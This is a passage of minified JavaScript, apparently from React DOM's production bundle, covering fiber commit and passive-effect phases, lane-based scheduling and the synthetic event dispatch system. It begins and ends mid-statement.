24:Ml(y,A,S,U,m),m&&J&2048&&iy(A.alternate,A);break;default:Ml(y,A,S,U,m)}a=a.sibling}}function Tu(r,a){if(a.subtreeFlags&10256)for(a=a.child;a!==null;){var l=r,u=a,m=u.flags;switch(u.tag){case 22:Tu(l,u),m&2048&&ny(u.alternate,u);break;case 24:Tu(l,u),m&2048&&iy(u.alternate,u);break;default:Tu(l,u)}a=a.sibling}}var Cu=8192;function Ol(r){if(r.subtreeFlags&Cu)for(r=r.child;r!==null;)jb(r),r=r.sibling}function jb(r){switch(r.tag){case 26:Ol(r),r.flags&Cu&&r.memoizedState!==null&&M3(mr,r.memoizedState,r.memoizedProps);break;case 5:Ol(r);break;case 3:case 4:var a=mr;mr=cf(r.stateNode.containerInfo),Ol(r),mr=a;break;case 22:r.memoizedState===null&&(a=r.alternate,a!==null&&a.memoizedState!==null?(a=Cu,Cu=16777216,Ol(r),Cu=a):Ol(r));break;default:Ol(r)}}function Lb(r){var a=r.alternate;if(a!==null&&(r=a.child,r!==null)){a.child=null;do a=r.sibling,r.sibling=null,r=a;while(r!==null)}}function Su(r){var a=r.deletions;if((r.flags&16)!==0){if(a!==null)for(var l=0;l<a.length;l++){var u=a[l];xn=u,Ub(u,r)}Lb(r)}if(r.subtreeFlags&10256)for(r=r.child;r!==null;)Vb(r),r=r.sibling}function Vb(r){switch(r.tag){case 0:case 11:case 15:Su(r),r.flags&2048&&ca(9,r,r.return);break;case 3:Su(r);break;case 12:Su(r);break;case 22:var a=r.stateNode;r.memoizedState!==null&&a._visibility&2&&(r.return===null||r.return.tag!==13)?(a._visibility&=-3,$h(r)):Su(r);break;default:Su(r)}}function $h(r){var a=r.deletions;if((r.flags&16)!==0){if(a!==null)for(var l=0;l<a.length;l++){var u=a[l];xn=u,Ub(u,r)}Lb(r)}for(r=r.child;r!==null;){switch(a=r,a.tag){case 0:case 11:case 15:ca(8,a,a.return),$h(a);break;case 22:l=a.stateNode,l._visibility&2&&(l._visibility&=-3,$h(a));break;default:$h(a)}r=r.sibling}}function Ub(r,a){for(;xn!==null;){var l=xn;switch(l.tag){case 0:case 11:case 15:ca(8,l,a);break;case 23:case 22:if(l.memoizedState!==null&&l.memoizedState.cachePool!==null){var u=l.memoizedState.cachePool.pool;u!=null&&u.refCount++}break;case 24:cu(l.memoizedState.cache)}if(u=l.child,u!==null)u.return=l,xn=u;else e:for(l=r;xn!==null;){u=xn;var m=u.sibling,y=u.return;if(Ib(u),u===l){xn=null;break e}if(m!==null){m.return=y,xn=m;break e}xn=y}}}var WR={getCacheForType:function(r){var a=Gn(mn),l=a.data.get(r);return l===void 0&&(l=r(),a.data.set(r,l)),l}},$R=typeof WeakMap=="function"?WeakMap:Map,Nt=0,Vt=null,st=null,ft=0,Rt=0,ki=null,ha=!1,Pl=!1,ry=!1,Cs=0,Qt=0,fa=0,So=0,sy=0,tr=0,jl=0,Nu=null,fi=null,ay=!1,oy=0,Xh=1/0,Zh=null,ma=null,Pn=0,pa=null,Ll=null,Vl=0,ly=0,cy=null,Bb=null,Ru=0,uy=null;function Di(){if((Nt&2)!==0&&ft!==0)return ft&-ft;if(ee.T!==null){var r=Tl;return r!==0?r:yy()}return H()}function zb(){tr===0&&(tr=(ft&536870912)===0||xt?as():536870912);var r=er.current;return r!==null&&(r.flags|=32),tr}function Mi(r,a,l){(r===Vt&&(Rt===2||Rt===9)||r.cancelPendingCommit!==null)&&(Ul(r,0),ga(r,ft,tr,!1)),dr(r,l),((Nt&2)===0||r!==Vt)&&(r===Vt&&((Nt&2)===0&&(So|=l),Qt===4&&ga(r,ft,tr,!1)),Hr(r))}function Fb(r,a,l){if((Nt&6)!==0)throw Error(i(327));var u=!l&&(a&124)===0&&(a&r.expiredLanes)===0||Fi(r,a),m=u?JR(r,a):fy(r,a,!0),y=u;do{if(m===0){Pl&&!u&&ga(r,a,0,!1);break}else{if(l=r.current.alternate,y&&!XR(l)){m=fy(r,a,!1),y=!1;continue}if(m===2){if(y=a,r.errorRecoveryDisabledLanes&y)var A=0;else A=r.pendingLanes&-536870913,A=A!==0?A:A&536870912?536870912:0;if(A!==0){a=A;e:{var S=r;m=Nu;var U=S.current.memoizedState.isDehydrated;if(U&&(Ul(S,A).flags|=256),A=fy(S,A,!1),A!==2){if(ry&&!U){S.errorRecoveryDisabledLanes|=y,So|=y,m=4;break e}y=fi,fi=m,y!==null&&(fi===null?fi=y:fi.push.apply(fi,y))}m=A}if(y=!1,m!==2)continue}}if(m===1){Ul(r,0),ga(r,a,0,!0);break}e:{switch(u=r,y=m,y){case 0:case 1:throw Error(i(345));case 4:if((a&4194048)!==a)break;case 6:ga(u,a,tr,!ha);break e;case 2:fi=null;break;case 3:case 5:break;default:throw Error(i(329))}if((a&62914560)===a&&(m=oy+300-Jn(),10<m)){if(ga(u,a,tr,!ha),ss(u,0,!0)!==0)break e;u.timeoutHandle=y1(Hb.bind(null,u,l,fi,Zh,ay,a,tr,So,jl,ha,y,2,-0,0),m);break e}Hb(u,l,fi,Zh,ay,a,tr,So,jl,ha,y,0,-0,0)}}break}while(!0);Hr(r)}function Hb(r,a,l,u,m,y,A,S,U,J,se,ce,te,ne){if(r.timeoutHandle=-1,ce=a.subtreeFlags,(ce&8192||(ce&16785408)===16785408)&&(ju={stylesheets:null,count:0,unsuspend:D3},jb(a),ce=O3(),ce!==null)){r.cancelPendingCommit=ce($b.bind(null,r,a,y,l,u,m,A,S,U,se,1,te,ne)),ga(r,y,A,!J);return}$b(r,a,y,l,u,m,A,S,U)}function XR(r){for(var a=r;;){var l=a.tag;if((l===0||l===11||l===15)&&a.flags&16384&&(l=a.updateQueue,l!==null&&(l=l.stores,l!==null)))for(var u=0;u<l.length;u++){var m=l[u],y=m.getSnapshot;m=m.value;try{if(!Si(y(),m))return!1}catch{return!1}}if(l=a.child,a.subtreeFlags&16384&&l!==null)l.return=a,a=l;else{if(a===r)break;for(;a.sibling===null;){if(a.return===null||a.return===r)return!0;a=a.return}a.sibling.return=a.return,a=a.sibling}}return!0}function ga(r,a,l,u){a&=~sy,a&=~So,r.suspendedLanes|=a,r.pingedLanes&=~a,u&&(r.warmLanes|=a),u=r.expirationTimes;for(var m=a;0<m;){var y=31-rn(m),A=1<<y;u[y]=-1,m&=~A}l!==0&&ei(r,l,a)}function Jh(){return(Nt&6)===0?(Iu(0),!1):!0}function dy(){if(st!==null){if(Rt===0)var r=st.return;else r=st,vs=bo=null,Ng(r),kl=null,wu=0,r=st;for(;r!==null;)xb(r.alternate,r),r=r.return;st=null}}function Ul(r,a){var l=r.timeoutHandle;l!==-1&&(r.timeoutHandle=-1,p3(l)),l=r.cancelPendingCommit,l!==null&&(r.cancelPendingCommit=null,l()),dy(),Vt=r,st=l=ps(r.current,null),ft=a,Rt=0,ki=null,ha=!1,Pl=Fi(r,a),ry=!1,jl=tr=sy=So=fa=Qt=0,fi=Nu=null,ay=!1,(a&8)!==0&&(a|=a&32);var u=r.entangledLanes;if(u!==0)for(r=r.entanglements,u&=a;0<u;){var m=31-rn(u),y=1<<m;a|=r[m],u&=~y}return Cs=a,bh(),l}function qb(r,a){$e=null,ee.H=Bh,a===du||a===Ih?(a=o2(),Rt=3):a===r2?(a=o2(),Rt=4):Rt=a===lb?8:a!==null&&typeof a=="object"&&typeof a.then=="function"?6:1,ki=a,st===null&&(Qt=1,Gh(r,$i(a,r.current)))}function Gb(){var r=ee.H;return ee.H=Bh,r===null?Bh:r}function Yb(){var r=ee.A;return ee.A=WR,r}function hy(){Qt=4,ha||(ft&4194048)!==ft&&er.current!==null||(Pl=!0),(fa&134217727)===0&&(So&134217727)===0||Vt===null||ga(Vt,ft,tr,!1)}function fy(r,a,l){var u=Nt;Nt|=2;var m=Gb(),y=Yb();(Vt!==r||ft!==a)&&(Zh=null,Ul(r,a)),a=!1;var A=Qt;e:do try{if(Rt!==0&&st!==null){var S=st,U=ki;switch(Rt){case 8:dy(),A=6;break e;case 3:case 2:case 9:case 6:er.current===null&&(a=!0);var J=Rt;if(Rt=0,ki=null,Bl(r,S,U,J),l&&Pl){A=0;break e}break;default:J=Rt,Rt=0,ki=null,Bl(r,S,U,J)}}ZR(),A=Qt;break}catch(se){qb(r,se)}while(!0);return a&&r.shellSuspendCounter++,vs=bo=null,Nt=u,ee.H=m,ee.A=y,st===null&&(Vt=null,ft=0,bh()),A}function ZR(){for(;st!==null;)Qb(st)}function JR(r,a){var l=Nt;Nt|=2;var u=Gb(),m=Yb();Vt!==r||ft!==a?(Zh=null,Xh=Jn()+500,Ul(r,a)):Pl=Fi(r,a);e:do try{if(Rt!==0&&st!==null){a=st;var y=ki;t:switch(Rt){case 1:Rt=0,ki=null,Bl(r,a,y,1);break;case 2:case 9:if(s2(y)){Rt=0,ki=null,Kb(a);break}a=function(){Rt!==2&&Rt!==9||Vt!==r||(Rt=7),Hr(r)},y.then(a,a);break e;case 3:Rt=7;break e;case 4:Rt=5;break e;case 7:s2(y)?(Rt=0,ki=null,Kb(a)):(Rt=0,ki=null,Bl(r,a,y,7));break;case 5:var A=null;switch(st.tag){case 26:A=st.memoizedState;case 5:case 27:var S=st;if(!A||R1(A)){Rt=0,ki=null;var U=S.sibling;if(U!==null)st=U;else{var J=S.return;J!==null?(st=J,ef(J)):st=null}break t}}Rt=0,ki=null,Bl(r,a,y,5);break;case 6:Rt=0,ki=null,Bl(r,a,y,6);break;case 8:dy(),Qt=6;break e;default:throw Error(i(462))}}e3();break}catch(se){qb(r,se)}while(!0);return vs=bo=null,ee.H=u,ee.A=m,Nt=l,st!==null?0:(Vt=null,ft=0,bh(),Qt)}function e3(){for(;st!==null&&!Ja();)Qb(st)}function Qb(r){var a=wb(r.alternate,r,Cs);r.memoizedProps=r.pendingProps,a===null?ef(r):st=a}function Kb(r){var a=r,l=a.alternate;switch(a.tag){case 15:case 0:a=mb(l,a,a.pendingProps,a.type,void 0,ft);break;case 11:a=mb(l,a,a.pendingProps,a.type.render,a.ref,ft);break;case 5:Ng(a);default:xb(l,a),a=st=Ww(a,Cs),a=wb(l,a,Cs)}r.memoizedProps=r.pendingProps,a===null?ef(r):st=a}function Bl(r,a,l,u){vs=bo=null,Ng(a),kl=null,wu=0;var m=a.return;try{if(HR(r,m,a,l,ft)){Qt=1,Gh(r,$i(l,r.current)),st=null;return}}catch(y){if(m!==null)throw st=m,y;Qt=1,Gh(r,$i(l,r.current)),st=null;return}a.flags&32768?(xt||u===1?r=!0:Pl||(ft&536870912)!==0?r=!1:(ha=r=!0,(u===2||u===9||u===3||u===6)&&(u=er.current,u!==null&&u.tag===13&&(u.flags|=16384))),Wb(a,r)):ef(a)}function ef(r){var a=r;do{if((a.flags&32768)!==0){Wb(a,ha);return}r=a.return;var l=GR(a.alternate,a,Cs);if(l!==null){st=l;return}if(a=a.sibling,a!==null){st=a;return}st=a=r}while(a!==null);Qt===0&&(Qt=5)}function Wb(r,a){do{var l=YR(r.alternate,r);if(l!==null){l.flags&=32767,st=l;return}if(l=r.return,l!==null&&(l.flags|=32768,l.subtreeFlags=0,l.deletions=null),!a&&(r=r.sibling,r!==null)){st=r;return}st=r=l}while(r!==null);Qt=6,st=null}function $b(r,a,l,u,m,y,A,S,U){r.cancelPendingCommit=null;do tf();while(Pn!==0);if((Nt&6)!==0)throw Error(i(327));if(a!==null){if(a===r.current)throw Error(i(177));if(y=a.lanes|a.childLanes,y|=ig,Xs(r,l,y,A,S,U),r===Vt&&(st=Vt=null,ft=0),Ll=a,pa=r,Vl=l,ly=y,cy=m,Bb=u,(a.subtreeFlags&10256)!==0||(a.flags&10256)!==0?(r.callbackNode=null,r.callbackPriority=0,r3(rs,function(){return t1(),null})):(r.callbackNode=null,r.callbackPriority=0),u=(a.flags&13878)!==0,(a.subtreeFlags&13878)!==0||u){u=ee.T,ee.T=null,m=me.p,me.p=2,A=Nt,Nt|=4;try{QR(r,a,l)}finally{Nt=A,me.p=m,ee.T=u}}Pn=1,Xb(),Zb(),Jb()}}function Xb(){if(Pn===1){Pn=0;var r=pa,a=Ll,l=(a.flags&13878)!==0;if((a.subtreeFlags&13878)!==0||l){l=ee.T,ee.T=null;var u=me.p;me.p=2;var m=Nt;Nt|=4;try{Mb(a,r);var y=Ty,A=Uw(r.containerInfo),S=y.focusedElem,U=y.selectionRange;if(A!==S&&S&&S.ownerDocument&&Vw(S.ownerDocument.documentElement,S)){if(U!==null&&Zp(S)){var J=U.start,se=U.end;if(se===void 0&&(se=J),"selectionStart"in S)S.selectionStart=J,S.selectionEnd=Math.min(se,S.value.length);else{var ce=S.ownerDocument||document,te=ce&&ce.defaultView||window;if(te.getSelection){var ne=te.getSelection(),Fe=S.textContent.length,Le=Math.min(U.start,Fe),Mt=U.end===void 0?Le:Math.min(U.end,Fe);!ne.extend&&Le>Mt&&(A=Mt,Mt=Le,Le=A);var K=Lw(S,Le),q=Lw(S,Mt);if(K&&q&&(ne.rangeCount!==1||ne.anchorNode!==K.node||ne.anchorOffset!==K.offset||ne.focusNode!==q.node||ne.focusOffset!==q.offset)){var X=ce.createRange();X.setStart(K.node,K.offset),ne.removeAllRanges(),Le>Mt?(ne.addRange(X),ne.extend(q.node,q.offset)):(X.setEnd(q.node,q.offset),ne.addRange(X))}}}}for(ce=[],ne=S;ne=ne.parentNode;)ne.nodeType===1&&ce.push({element:ne,left:ne.scrollLeft,top:ne.scrollTop});for(typeof S.focus=="function"&&S.focus(),S=0;S<ce.length;S++){var oe=ce[S];oe.element.scrollLeft=oe.left,oe.element.scrollTop=oe.top}}mf=!!Ey,Ty=Ey=null}finally{Nt=m,me.p=u,ee.T=l}}r.current=a,Pn=2}}function Zb(){if(Pn===2){Pn=0;var r=pa,a=Ll,l=(a.flags&8772)!==0;if((a.subtreeFlags&8772)!==0||l){l=ee.T,ee.T=null;var u=me.p;me.p=2;var m=Nt;Nt|=4;try{Rb(r,a.alternate,a)}finally{Nt=m,me.p=u,ee.T=l}}Pn=3}}function Jb(){if(Pn===4||Pn===3){Pn=0,al();var r=pa,a=Ll,l=Vl,u=Bb;(a.subtreeFlags&10256)!==0||(a.flags&10256)!==0?Pn=5:(Pn=0,Ll=pa=null,e1(r,r.pendingLanes));var m=r.pendingLanes;if(m===0&&(ma=null),Zs(l),a=a.stateNode,We&&typeof We.onCommitFiberRoot=="function")try{We.onCommitFiberRoot(bt,a,void 0,(a.current.flags&128)===128)}catch{}if(u!==null){a=ee.T,m=me.p,me.p=2,ee.T=null;try{for(var y=r.onRecoverableError,A=0;A<u.length;A++){var S=u[A];y(S.value,{componentStack:S.stack})}}finally{ee.T=a,me.p=m}}(Vl&3)!==0&&tf(),Hr(r),m=r.pendingLanes,(l&4194090)!==0&&(m&42)!==0?r===uy?Ru++:(Ru=0,uy=r):Ru=0,Iu(0)}}function e1(r,a){(r.pooledCacheLanes&=a)===0&&(a=r.pooledCache,a!=null&&(r.pooledCache=null,cu(a)))}function tf(r){return Xb(),Zb(),Jb(),t1()}function t1(){if(Pn!==5)return!1;var r=pa,a=ly;ly=0;var l=Zs(Vl),u=ee.T,m=me.p;try{me.p=32>l?32:l,ee.T=null,l=cy,cy=null;var y=pa,A=Vl;if(Pn=0,Ll=pa=null,Vl=0,(Nt&6)!==0)throw Error(i(331));var S=Nt;if(Nt|=4,Vb(y.current),Pb(y,y.current,A,l),Nt=S,Iu(0,!1),We&&typeof We.onPostCommitFiberRoot=="function")try{We.onPostCommitFiberRoot(bt,y)}catch{}return!0}finally{me.p=m,ee.T=u,e1(r,a)}}function n1(r,a,l){a=$i(l,a),a=Fg(r.stateNode,a,2),r=sa(r,a,2),r!==null&&(dr(r,2),Hr(r))}function Lt(r,a,l){if(r.tag===3)n1(r,r,l);else for(;a!==null;){if(a.tag===3){n1(a,r,l);break}else if(a.tag===1){var u=a.stateNode;if(typeof a.type.getDerivedStateFromError=="function"||typeof u.componentDidCatch=="function"&&(ma===null||!ma.has(u))){r=$i(l,r),l=ab(2),u=sa(a,l,2),u!==null&&(ob(l,u,a,r),dr(u,2),Hr(u));break}}a=a.return}}function my(r,a,l){var u=r.pingCache;if(u===null){u=r.pingCache=new $R;var m=new Set;u.set(a,m)}else m=u.get(a),m===void 0&&(m=new Set,u.set(a,m));m.has(l)||(ry=!0,m.add(l),r=t3.bind(null,r,a,l),a.then(r,r))}function t3(r,a,l){var u=r.pingCache;u!==null&&u.delete(a),r.pingedLanes|=r.suspendedLanes&l,r.warmLanes&=~l,Vt===r&&(ft&l)===l&&(Qt===4||Qt===3&&(ft&62914560)===ft&&300>Jn()-oy?(Nt&2)===0&&Ul(r,0):sy|=l,jl===ft&&(jl=0)),Hr(r)}function i1(r,a){a===0&&(a=to()),r=bl(r,a),r!==null&&(dr(r,a),Hr(r))}function n3(r){var a=r.memoizedState,l=0;a!==null&&(l=a.retryLane),i1(r,l)}function i3(r,a){var l=0;switch(r.tag){case 13:var u=r.stateNode,m=r.memoizedState;m!==null&&(l=m.retryLane);break;case 19:u=r.stateNode;break;case 22:u=r.stateNode._retryCache;break;default:throw Error(i(314))}u!==null&&u.delete(a),i1(r,l)}function r3(r,a){return is(r,a)}var nf=null,zl=null,py=!1,rf=!1,gy=!1,No=0;function Hr(r){r!==zl&&r.next===null&&(zl===null?nf=zl=r:zl=zl.next=r),rf=!0,py||(py=!0,a3())}function Iu(r,a){if(!gy&&rf){gy=!0;do for(var l=!1,u=nf;u!==null;){if(r!==0){var m=u.pendingLanes;if(m===0)var y=0;else{var A=u.suspendedLanes,S=u.pingedLanes;y=(1<<31-rn(42|r)+1)-1,y&=m&~(A&~S),y=y&201326741?y&201326741|1:y?y|2:0}y!==0&&(l=!0,o1(u,y))}else y=ft,y=ss(u,u===Vt?y:0,u.cancelPendingCommit!==null||u.timeoutHandle!==-1),(y&3)===0||Fi(u,y)||(l=!0,o1(u,y));u=u.next}while(l);gy=!1}}function s3(){r1()}function r1(){rf=py=!1;var r=0;No!==0&&(m3()&&(r=No),No=0);for(var a=Jn(),l=null,u=nf;u!==null;){var m=u.next,y=s1(u,a);y===0?(u.next=null,l===null?nf=m:l.next=m,m===null&&(zl=l)):(l=u,(r!==0||(y&3)!==0)&&(rf=!0)),u=m}Iu(r)}function s1(r,a){for(var l=r.suspendedLanes,u=r.pingedLanes,m=r.expirationTimes,y=r.pendingLanes&-62914561;0<y;){var A=31-rn(y),S=1<<A,U=m[A];U===-1?((S&l)===0||(S&u)!==0)&&(m[A]=$s(S,a)):U<=a&&(r.expiredLanes|=S),y&=~S}if(a=Vt,l=ft,l=ss(r,r===a?l:0,r.cancelPendingCommit!==null||r.timeoutHandle!==-1),u=r.callbackNode,l===0||r===a&&(Rt===2||Rt===9)||r.cancelPendingCommit!==null)return u!==null&&u!==null&&Zn(u),r.callbackNode=null,r.callbackPriority=0;if((l&3)===0||Fi(r,l)){if(a=l&-l,a===r.callbackPriority)return a;switch(u!==null&&Zn(u),Zs(l)){case 2:case 8:l=Qs;break;case 32:l=rs;break;case 268435456:l=Bi;break;default:l=rs}return u=a1.bind(null,r),l=is(l,u),r.callbackPriority=a,r.callbackNode=l,a}return u!==null&&u!==null&&Zn(u),r.callbackPriority=2,r.callbackNode=null,2}function a1(r,a){if(Pn!==0&&Pn!==5)return r.callbackNode=null,r.callbackPriority=0,null;var l=r.callbackNode;if(tf()&&r.callbackNode!==l)return null;var u=ft;return u=ss(r,r===Vt?u:0,r.cancelPendingCommit!==null||r.timeoutHandle!==-1),u===0?null:(Fb(r,u,a),s1(r,Jn()),r.callbackNode!=null&&r.callbackNode===l?a1.bind(null,r):null)}function o1(r,a){if(tf())return null;Fb(r,a,!0)}function a3(){g3(function(){(Nt&6)!==0?is(eo,s3):r1()})}function yy(){return No===0&&(No=as()),No}function l1(r){return r==null||typeof r=="symbol"||typeof r=="boolean"?null:typeof r=="function"?r:cl(""+r)}function c1(r,a){var l=a.ownerDocument.createElement("input");return l.name=a.name,l.value=a.value,r.id&&l.setAttribute("form",r.id),a.parentNode.insertBefore(l,a),r=new FormData(r),l.parentNode.removeChild(l),r}function o3(r,a,l,u,m){if(a==="submit"&&l&&l.stateNode===m){var y=l1((m[pe]||null).action),A=u.submitter;A&&(a=(a=A[pe]||null)?l1(a.formAction):A.getAttribute("formAction"),a!==null&&(y=a,A=null));var S=new ul("action","action",null,u,m);r.push({event:S,listeners:[{instance:null,listener:function(){if(u.defaultPrevented){if(No!==0){var U=A?c1(m,A):new FormData(m);Lg(l,{pending:!0,data:U,method:m.method,action:y},null,U)}}else typeof y=="function"&&(S.preventDefault(),U=A?c1(m,A):new FormData(m),Lg(l,{pending:!0,data:U,method:m.method,action:y},y,U))},currentTarget:m}]})}}for(var vy=0;vy<ng.length;vy++){var _y=ng[vy],l3=_y.toLowerCase(),c3=_y[0].toUpperCase()+_y.slice(1);fr(l3,"on"+c3)}fr(Fw,"onAnimationEnd"),fr(Hw,"onAnimationIteration"),fr(qw,"onAnimationStart"),fr("dblclick","onDoubleClick"),fr("focusin","onFocus"),fr("focusout","onBlur"),fr(CR,"onTransitionRun"),fr(SR,"onTransitionStart"),fr(NR,"onTransitionCancel"),fr(Gw,"onTransitionEnd"),ti("onMouseEnter",["mouseout","mouseover"]),ti("onMouseLeave",["mouseout","mouseover"]),ti("onPointerEnter",["pointerout","pointerover"]),ti("onPointerLeave",["pointerout","pointerover"]),dn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),dn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),dn("onBeforeInput",["compositionend","keypress","textInput","paste"]),dn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),dn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),dn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var ku="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),u3=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(ku));function u1(r,a){a=(a&4)!==0;for(var l=0;l<r.length;l++){var u=r[l],m=u.event;u=u.listeners;e:{var y=void 0;if(a)for(var A=u.length-1;0<=A;A--){var S=u[A],U=S.instance,J=S.currentTarget;if(S=S.listener,U!==y&&m.isPropagationStopped())break e;y=S,m.currentTarget=J;try{y(m)}catch(se){qh(se)}m.currentTarget=null,y=U}else for(A=0;A<u.length;A++){if(S=u[A],U=S.instance,J=S.currentTarget,S=S.listener,U!==y&&m.isPropagationStopped())break e;y=S,m.currentTarget=J;try{y(m)}catch(se){qh(se)}m.currentTarget=null,y=U}}}}function at(r,a){var l=a[De];l===void 0&&(l=a[De]=new Set);var u=r+"__bubble";l.has(u)||(d1(a,r,2,!1),l.add(u))}function wy(r,a,l){var u=0;a&&(u|=4),d1(l,r,u,a)}var sf="_reactListening"+Math.random().toString(36).slice(2);function by(r){if(!r[sf]){r[sf]=!0,Ze.forEach(function(l){l!=="selectionchange"&&(u3.has(l)||wy(l,!1,r),wy(l,!0,r))});var a=r.nodeType===9?r:r.ownerDocument;a===null||a[sf]||(a[sf]=!0,wy("selectionchange",!1,a))}}function d1(r,a,l,u){switch(P1(a)){case 2:var m=L3;break;case 8:m=V3;break;default:m=Py}l=m.bind(null,a,l,r),m=void 0,!Ki||a!=="touchstart"&&a!=="touchmove"&&a!=="wheel"||(m=!0),u?m!==void 0?r.addEventListener(a,l,{capture:!0,passive:m}):r.addEventListener(a,l,!0):m!==void 0?r.addEventListener(a,l,{passive:m}):r.addEventListener(a,l,!1)}function xy(r,a,l,u,m){var y=u;if((a&1)===0&&(a&2)===0&&u!==null)e:for(;;){if(u===null)return;var A=u.tag;if(A===3||A===4){var S=u.stateNode.containerInfo;if(S===m)break;if(A===4)for(A=u.return;A!==null;){var U=A.tag;if((U===3||U===4)&&A.stateNode.containerInfo===m)return;A=A.return}for(;S!==null;){if(A=Ve(S),A===null)return;if(U=A.tag,U===5||U===6||U===26||U===27){u=y=A;continue e}S=S.parentNode}}u=u.return}ah(function(){var J=y,se=Qi(l),ce=[];e:{var te=Yw.get(r);if(te!==void 0){var ne=ul,Fe=r;switch(r){case"keypress":if(Or(l)===0)break e;case"keydown":case"keyup":ne=gl;break;case"focusin":Fe="focus",ne=fl;break;case"focusout":Fe="blur",ne=fl;break;case"beforeblur":case"afterblur":ne=fl;break;case"click":if(l.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":ne=Wi;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":ne=Kp;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":ne=mh;break;case Fw:case Hw:case qw:ne=ml;break;case Gw:ne=gh;break;case"scroll":case"scrollend":ne=oh;break;case"wheel":ne=yl;break;case"copy":case"cut":case"paste":ne=pl;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":ne=tu;break;case"toggle":case"beforetoggle":ne=vh}var Le=(a&4)!==0,Mt=!Le&&(r==="scroll"||r==="scrollend"),K=Le?te!==null?te+"Capture":null:te;Le=[];for(var q=J,X;q!==null;){var oe=q;if(X=oe.stateNode,oe=oe.tag,oe!==5&&oe!==26&&oe!==27||X===null||K===null||(oe=ao(q,K),oe!=null&&Le.push(Du(q,oe,X))),Mt)break;q=q.return}0<Le.length&&(te=new ne(te,Fe,null,l,se),ce.push({event:te,listeners:Le}))}}if((a&7)===0){e:{if(te=r==="mouseover"||r==="pointerover",ne=r==="mouseout"||r==="pointerout",te&&l!==cs&&(Fe=l.relatedTarget||l.fromElement)&&(Ve(Fe)||Fe[be]))break e;if((ne||te)&&(te=se.window===se?se:(te=se.ownerDocument)?te.defaultView||te.parentWindow:window,ne?(Fe=l.relatedTarget||l.toElement,ne=J,Fe=Fe?Ve(Fe):null,Fe!==null&&(Mt=o(Fe),Le=Fe.tag,Fe!==Mt||Le!==5&&Le!==27&&Le!==6)&&(Fe=null)):(ne=null,Fe=J),ne!==Fe)){if(Le=Wi,oe="onMouseLeave",K="onMouseEnter",q="mouse",(r==="pointerout"||r==="pointerover")&&(Le=tu,oe="onPointerLeave",K="onPointerEnter",q="pointer"),Mt=ne==null?te:Tt(ne),X=Fe==null?te:Tt(Fe),te=new Le(oe,q+"leave",ne,l,se),te.target=Mt,te.relatedTarget=X,oe=null,Ve(se)===J&&(Le=new Le(K,q+"enter",Fe,l,se),Le.target=X,Le.relatedTarget=Mt,oe=Le),Mt=oe,ne&&Fe)t:{for(Le=ne,K=Fe,q=0,X=Le;X;X=Fl(X))q++;for(X=0,oe=K;oe;oe=Fl(oe))X++;for(;0<q-X;)Le=Fl(Le),q--;for(;0<X-q;)K=Fl(K),X--;for(;q--;){if(Le===K||K!==null&&Le===K.alternate)break t;Le=Fl(Le),K=Fl(K)}Le=null}else Le=null;ne!==null&&h1(ce,te,ne,Le,!1),Fe!==null&&Mt!==null&&h1(ce,Mt,Fe,Le,!0)}}e:{if(te=J?Tt(J):window,ne=te.nodeName&&te.nodeName.toLowerCase(),ne==="select"||ne==="input"&&te.type==="file")var Ee=kw;else if(fn(te))if(Dw)Ee=AR;else{Ee=bR;var Je=wR}else ne=te.nodeName,!ne||ne.toLowerCase()!=="input"||te.type!=="checkbox"&&te.type!=="radio"?J&&Kc(J.elementType)&&(Ee=kw):Ee=xR;if(Ee&&(Ee=Ee(r,J))){ms(ce,Ee,l,se);break e}Je&&Je(r,te,J),r==="focusout"&&J&&te.type==="number"&&J.memoizedProps.value!=null&&ea(te,"number",te.value)}switch(Je=J?Tt(J):window,r){case"focusin":(fn(Je)||Je.contentEditable==="true")&&(vl=Je,Jp=J,ru=null);break;case"focusout":ru=Jp=vl=null;break;case"mousedown":eg=!0;break;case"contextmenu":case"mouseup":case"dragend":eg=!1,Bw(ce,l,se);break;case"selectionchange":if(TR)break;case"keydown":case"keyup":Bw(ce,l,se)}var Ie;if(Lr)e:{switch(r){case"compositionstart":var Ue="onCompositionStart";break e;case"compositionend":Ue="onCompositionEnd";break e;case"compositionupdate":Ue="onCompositionUpdate";break e}Ue=void 0}else dt?ie(r,l)&&(Ue="onCompositionEnd"):r==="keydown"&&l.keyCode===229&&(Ue="onCompositionStart");Ue&&(x&&l.locale!=="ko"&&(dt||Ue!=="onCompositionStart"?Ue==="onCompositionEnd"&&dt&&(Ie=$c()):(Mr=se,ta="value"in Mr?Mr.value:Mr.textContent,dt=!0)),Je=af(J,Ue),0<Je.length&&(Ue=new Jc(Ue,r,null,l,se),ce.push({event:Ue,listeners:Je}),Ie?Ue.data=Ie:(Ie=ve(l),Ie!==null&&(Ue.data=Ie)))),(Ie=_?hn(r,l):ht(r,l))&&(Ue=af(J,"onBeforeInput"),0<Ue.length&&(Je=new Jc("onBeforeInput","beforeinput",null,l,se),ce.push({event:Je,listeners:Ue}),Je.data=Ie)),o3(ce,r,J,l,se)}u1(ce,a)})}function Du(r,a,l){return{instance:r,listener:a,currentTarget:l}}function af(r,a){for(var l=a+"Capture",u=[];r!==null;){var m=r,y=m.stateNode;if(m=m.tag,m!==5&&m!==26&&m!==27||y===null||(m=ao(r,l),m!=null&&u.unshift(Du(r,m,y)),m=ao(r,a),m!=null&&u.push(Du(r,m,y))),r.tag===3)return u;r=r.return}return[]}function Fl(r){if(r===null)return null;do r=r.return;while(r&&r.tag!==5&&r.tag!==27);return r||null}function h1(r,a,l,u,m){for(var y=a._reactName,A=[];l!==null&&l!==u;){var 